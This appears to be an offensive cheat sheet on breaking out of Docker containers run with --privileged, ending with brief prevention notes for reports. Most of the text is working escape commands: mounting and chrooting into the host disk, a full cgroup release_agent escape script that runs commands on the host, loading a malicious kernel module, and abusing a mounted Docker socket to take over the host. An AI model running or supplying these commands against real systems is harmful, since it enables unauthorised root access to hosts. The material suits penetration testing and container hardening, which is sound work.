# Escaping From `--privileged` Containers

## Why `--privileged` Is Dangerous
`--privileged` disables nearly all container isolation: it grants all Linux capabilities, disables seccomp/AppArmor filtering, and gives the container access to all host devices. A privileged container is effectively root on the host with extra steps.

## Quick Confirmation You're in a Privileged Container
```bash
cat /proc/self/status | grep Cap        # check CapEff — all-Fs (ffffffffffffffff) means everything is granted
mount | grep -i cgroup
ls -la /dev                             # a privileged container sees ALL host devices, not just a minimal set
```

## Technique 1: Mount the Host Filesystem via Host Disk Device
```bash
fdisk -l                       # find the host's root disk, e.g. /dev/sda1
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash     # full host filesystem access as root
```

## Technique 2: cgroup release_agent Escape (Classic, Widely Documented)
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output   # command ran in the HOST's context
```
Abuses the cgroups `release_agent` file, which the kernel executes on the host when a cgroup with no more processes is released — a privileged container can write to this file and point it at an attacker-controlled script.

## Technique 3: Loading a Malicious Kernel Module
```bash
insmod /path/to/malicious.ko
```
A privileged container can load kernel modules directly, since `CAP_SYS_MODULE` isn't dropped — a loaded module executes with full kernel privileges, affecting the actual host kernel (containers don't have separate kernels).

## Technique 4: Abusing `/dev/mem` or `/dev/kmem` (If Present)
Direct physical/kernel memory access devices, when exposed, allow reading/writing arbitrary host memory — a very direct (if fragile) escape path when available.

## Technique 5: Docker Socket Mounted Inside the Container
```bash
ls -la /var/run/docker.sock
```
If the host's Docker socket is mounted inside the container (common in CI/CD runner setups), you can simply ask the host's Docker daemon to spin up a new privileged container with the host filesystem bind-mounted:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh
```

## Detection/Prevention Notes (for reports)
- Never use `--privileged` in production; grant only the specific capabilities actually required (`--cap-add=NET_ADMIN`, etc.).
- Never mount the host's Docker socket into a container unless absolutely necessary, and if unavoidable, tightly restrict what can reach that container.
- Keep seccomp/AppArmor profiles enabled — they're disabled entirely by `--privileged`, which is a large part of why it's so dangerous.